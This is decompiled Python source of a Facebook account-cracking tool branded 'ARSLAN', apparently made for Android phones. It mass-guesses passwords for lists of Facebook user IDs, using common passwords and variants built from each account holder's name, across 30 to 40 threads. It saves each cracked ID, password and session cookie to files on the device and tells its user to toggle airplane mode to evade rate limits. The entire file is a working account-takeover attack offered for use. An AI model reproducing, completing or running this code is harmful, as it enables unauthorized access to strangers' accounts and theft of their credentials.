#Decompiled By Telegram @ArmanTool99281_bot
#t.me/ArmanTool99281_bot
...
import string
import uuid
from concurrent.futures import ThreadPoolExecutor as ARSLANredhat
from string import *
...
samsung = random.choice([
    ...
    'GT-P5100|JDQ',
    'SM-T311|KOT49H'])
mamu = requests.get('https://arman-f9a3b-default-rtdb.firebaseio.com/keys/123').text.splitlines()
...
cok = []
plist = []
sys.stdout.write('\x1b]2; 🦝🐼 ARSLAN TOOL 🦅🏴\x07')
head = {
...
os.system('espeak -a 300 " Welcome,   to,  ARSLAN,  PAID,   Tools"')
os.system('espeak -a 300 " Please,   Text,   Tools,   Owner,   Name,   Sir,"')
os.system('xdg-open https://wa.me/923202271931')
...
if attemps < 30:
    ...
    if username == 'ARSLAN' and password == 'ARSLAN':
...
def menu():
    ...
    print('\x1b[1;31m[\x1b[1;32m6\x1b[1;31m]\x1b[1;37m GITHUB REPOSITORY')
    ...
    if select == '5':
        ...
        return None
    if select == '6':
        os.system('xdg-open https://github.com/armankhan2k56-creator/armankhan.git')
        menu()
        return None
    if select == '0':
        exit('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXIT DONE ')
        return None
    print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m VALID OPTION')
    time.sleep(2)
    menu()
    ...
    if ask in ('1',):
        ...
        for i in range(int(limit)):
            ...
            for i in range(int(limit)):
                ...
                user.append(data)
                ARSLAN = ARSLANredhat(max_workers = 40)
                clear()
                print('\x1b[1;41m\x1b[1;37m[𝐔𝐒𝐄𝐑 \x1b[1;42m\x1b[1;37m𝐍𝐀𝐌𝐄 ]\x1b[0m ' + uname)
...
def login(uid):
    ...
    for pw in ('123456', '1234567', '12345678', '123456789', '123123', '112233', '1234567890'):
        ...
        if 'session_key' in rp:
            print(f'''\r{R}[{R}ARSLAN-CP{R}]{R} {uid} | {pw}''')
            open('/sdcard/ARSLAN.txt', 'a').write(uid + '|' + pw + '\n')
            cps.append(uid)
        if 'www.facebook.com' in rp['error_msg']:
            print(f'''\r{R}[{G1}ARSLAN-OK{R}]{G1} {uid} | {pw}''')
            open('/sdcard/ARSLAN-OK.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
...
def _randm_():
    ...
    if select == '0':
        menu()
        return None
    print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m] VALID OPTION')
    time.sleep(2)
    _randm_()
...
def _bd_():
    ...
    for x in range(limit):
        ...
        user.append(nmp)
        clear()
        sexy = ARSLANredhat(max_workers = 30)
        clear()
        print('\x1b[1;41m\x1b[1;37m[𝐔𝐒𝐄𝐑 \x1b[1;42m\x1b[1;37m𝐍𝐀𝐌𝐄 ]\x1b[0m ' + uname)
        ...
        linex()
        for love in user:
            ids = code + name + cod + str(love)
            psd = [
                code + name + cod + str(love),
                cod + str(love),
                name + str(love),
                code + name + cod,
                'bangladesh',
...
class main_crack:
    ...
    def crack(self, id):
        clear()
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G1} /sdcard/ARSLAN.txt''')
        linex()
    ...
    def pasw(self):
        ...
        for sr in range(sl):
            ...
            print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN''')
            linex()
            ARSLANworld = ARSLANredhat(max_workers = 30)
            for zsb in self.id:
                (uid, name) = zsb.split('|')
                sz = name.split(' ')
                pwx = pw
                if 'methodA' in methods:
                    ARSLANworld.submit(self.methodA, uid, name, pwx)
                if 'methodB' in methods:
                    ARSLANworld.submit(self.methodB, uid, name, pwx)
                if 'methodC' in methods:
                    ARSLANworld.submit(self.methodC, uid, name, pwx)
        result(oks, cps)

    
    def methodA(self, sid, name, psw):
        global loop
        sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;32mARSLAN-M1\x1b[1;31m] \x1b[1;36m{loop}\x1b[1;35m \x1b[1;34m|\x1b[1;32m OK\x1b[1;34m|\x1b[1;31mCP \x1b[1;32m{len(oks)}\x1b[1;34m|\x1b[1;31m{len(cps)} \x1b[1;34m| \x1b[1;36m{'{:.0%}'.format(loop / float(len(self.id)))}{S}''')
        sys.stdout.flush()
        fs = name.split(' ')[0]
        ls = name.split(' ')[-1]
        for pw in psw:
            ...
            if 'session_key' in q:
                ...
                ARSLANb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookie = f'''sb={ARSLANb};{ckkk}'''
                print(f'''\r\r\x1b[1;31m[\x1b[1;32mARSLAN-OK\x1b[1;31m]\x1b[1;32m {sid} | {ps} ''')
                print(f'''\r\r\x1b[1;31m[\x1b[1;32mCOOKIES\x1b[1;31m]{O}{cookie} ''')
                open('/sdcard/ARSLAN-M1-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                oks.append(sid)
            if 'www.facebook.com' in str(q):
                print(f'''\r\r{M}[ARSLAN-CP] {sid} | {ps} ''')
                open('/sdcard/ARSLAN-M1-FILE-OK.txt', 'a').write(sid + '|' + ps + '\n')
                cps.append(sid)
            loop += 1
            return None
    ...
    def methodB(self, sid, name, psw):
        ...
        sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;32mARSLAN-M2\x1b[1;31m] \x1b[1;36m{loop}\x1b[1;35m \x1b[1;34m|\x1b[1;32m OK\x1b[1;34m|\x1b[1;31mCP \x1b[1;32m{len(oks)}\x1b[1;34m|\x1b[1;31m{len(cps)} \x1b[1;34m| \x1b[1;36m{'{:.0%}'.format(loop / float(len(self.id)))}{S}''')
        sys.stdout.flush()
        fs = name.split(' ')[0]
        ls = name.split(' ')[-1]
        for pw in psw:
            ...
            if 'session_key' in q:
                ...
                print(f'''\r\r\x1b[1;31m[\x1b[1;32mARSLAN-OK\x1b[1;31m]\x1b[1;32m {sid} | {ps} ''')
                print(f'''\r\r\x1b[1;31m[\x1b[1;32mCOOKIES\x1b[1;31m]{O}{cookie} ''')
                open('/sdcard/ARSLAN-M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                oks.append(sid)
            if 'www.facebook.com' in str(q):
                print(f'''\r\r{M}[ARSLAN-CP] {sid} | {ps} ''')
                open('/sdcard/ARSLAN-M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '\n')
                cps.append(sid)
            loop += 1
            return None
    ...
    def methodC(self, sid, name, psw):
        global loop
        sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;32mARSLAN-M3\x1b[1;31m] \x1b[1;36m{loop}\x1b[1;35m \x1b[1;34m|\x1b[1;32m OK\x1b[1;34m|\x1b[1;31mCP \x1b[1;32m{len(oks)}\x1b[1;34m|\x1b[1;31m{len(cps)} \x1b[1;34m| \x1b[1;36m{'{:.0%}'.format(loop / float(len(self.id)))}{S}''')
        sys.stdout.flush()
        fs = name.split(' ')[0]
        ls = name.split(' ')[-1]
        for pw in psw:
            ...
            if 'session_key' in q:
                ...
                print(f'''\r\r\x1b[1;31m[\x1b[1;32mARSLAN-OK\x1b[1;31m]\x1b[1;32m {sid} | {ps} ''')
                print(f'''\r\r\x1b[1;31m[\x1b[1;32mCOOKIES\x1b[1;31m]{O}{cookie} ''')
                open('/sdcard/ARSLAN-M3-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                oks.append(sid)
            if 'www.facebook.com' in str(q):
                print(f'''\r\r{M}[ARSLAN-CP] {sid} | {ps} ''')
                open('/sdcard/ARSLAN-M3-FILE-OK.txt', 'a').write(sid + '|' + ps + '\n')
                cps.append(sid)
            loop += 1
            return None
...
def randm(ids, psd):
    ...
    sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;32mARSLAN-RNDM\x1b[1;31m] \x1b[1;37m{loop}\x1b[1;37m \x1b[1;32m|\x1b[1;32m OK{A}/{R}CP \x1b[1;37m|\x1b[1;32m {G}{len(ok)}/{R}{len(cp)} ''')
    sys.stdout.flush()
    for pas in psd:
        data = {
            'locale': 'en_US',
        ...
        if 'access_token' in q:
            ...
            ARSLANb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
            cookie = f'''sb={ARSLANb};{ckkk}'''
            print(f'''\r\r\x1b[1;31m[\x1b[1;32mARSLAN-OK\x1b[1;31m]\x1b[1;32m {uid} | {pas}''')
            print(f'''\r\r\x1b[1;31m[\x1b[1;32mCOOKIE\x1b[1;31m]{R} {cookie}''')
            open('/sdcard/ARSLAN-RNDM-OK.txt', 'a').write(uid + '|' + pas + '|' + cookie + '\n')
            ok.append(uid)
        elif 'error' in q and 'www.facebook.com' in str(q):
            print(f'''\r\r{M}[ARSLAN-CP] {ids} | {pas} ''')
            open('/sdcard/ARSLAN-RNDM-CP.txt', 'a').write(ids + '|' + pas + '\n')
            cps.append(ids)
        loop += 1
        return None
